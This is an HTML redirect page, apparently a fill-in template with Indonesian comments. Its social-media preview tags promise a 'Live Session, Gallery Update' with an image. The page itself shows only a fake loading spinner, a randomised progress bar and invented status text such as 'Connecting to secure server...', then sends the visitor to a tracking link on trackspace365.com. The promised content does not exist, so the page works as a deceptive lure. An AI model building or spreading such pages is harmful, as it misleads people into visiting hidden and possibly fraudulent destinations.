<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />

  <title>Loading...</title>

  <!-- ================= OG PREVIEW ================= -->
  <!-- Ganti title/description/image sesuai kebutuhan -->
  <meta property="og:title" content="✨Live Session, Gallery Update" />
  <meta property="og:description" content="A Small Collections Preview " />
  <meta property="og:image" content="https://i.imgur.com/VsKHCe6.jpeg" />
  <meta property="og:image:width" content="1200" />
  <meta property="og:image:height" content="630" />
  <meta property="og:type" content="website" />

  <!-- WAJIB ganti kalau domain berubah -->
  <meta property="og:url" content="https://live-stream-room3.vercel.app" />

  <!-- ================= BASIC SEO ================= -->
  <meta name="robots" content="index, follow" />
  <meta name="theme-color" content="#0f0f0f" />

  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      background: #0f0f0f;
      color: white;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      overflow: hidden;
    }

    .container {
      width: 100%;
      max-width: 340px;
      text-align: center;
      padding: 20px;
    }

    /* ===== Spinner ===== */
    .loader {
      width: 60px;
      height: 60px;
      border: 5px solid rgba(255,255,255,0.08);
      border-top: 5px solid #00ffcc;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 0 auto 25px;
    }

    @keyframes spin {
      0% {
        transform: rotate(0deg);
      }
      100% {
        transform: rotate(360deg);
      }
    }

    h2 {
      font-size: 22px;
      margin-bottom: 14px;
      font-weight: 600;
    }

    p {
      font-size: 13px;
      opacity: 0.65;
      margin-top: 10px;
    }

    /* ===== Progress Bar ===== */
    .progress-wrapper {
      width: 100%;
      height: 10px;
      background: #1d1d1d;
      border-radius: 999px;
      overflow: hidden;
      margin-top: 15px;
    }

    .progress {
      width: 0%;
      height: 100%;
      border-radius: 999px;
      background: linear-gradient(90deg, #00ffcc, #00c3ff);
      transition: width 0.25s ease;
    }

    .percent {
      margin-top: 10px;
      font-size: 14px;
      opacity: 0.8;
    }
  </style>
</head>

<body>

  <div class="container">

    <div class="loader"></div>

    <h2 id="status">Preparing your content...</h2>

    <div class="progress-wrapper">
      <div class="progress" id="progress"></div>
    </div>

    <div class="percent" id="percent">0%</div>

    <p>Please wait a moment</p>

  </div>

  <script>
    // ================= SETTINGS =================

    // GANTI ke link tujuan kamu
    const REDIRECT_URL = "https://dfbjbie.trackspace365.com/p/Lp0Q6";

    // Total waktu loading (ms)
    const TOTAL_DURATION = 5000;

    // ================= ELEMENT =================

    const progressBar = document.getElementById("progress");
    const percentText = document.getElementById("percent");
    const statusText = document.getElementById("status");

    // ================= LOADING SYSTEM =================

    let progress = 0;

    const interval = setInterval(() => {

      // Random biar lebih natural
      progress += Math.random() * 12;

      if (progress > 100) {
        progress = 100;
      }

      // Update UI
      progressBar.style.width = progress + "%";
      percentText.innerText = Math.floor(progress) + "%";

      // Dynamic status
      if (progress < 25) {
        statusText.innerText = "Preparing your content...";
      }
      else if (progress < 50) {
        statusText.innerText = "Connecting to secure server...";
      }
      else if (progress < 75) {
        statusText.innerText = "Loading media assets...";
      }
      else if (progress < 95) {
        statusText.innerText = "Almost ready...";
      }
      else {
        statusText.innerText = "Launching...";
      }

      // Redirect
      if (progress >= 100) {
        clearInterval(interval);

        setTimeout(() => {
          window.location.href = REDIRECT_URL;
        }, 500);
      }

    }, TOTAL_DURATION / 25);
  </script>

</body>
</html>
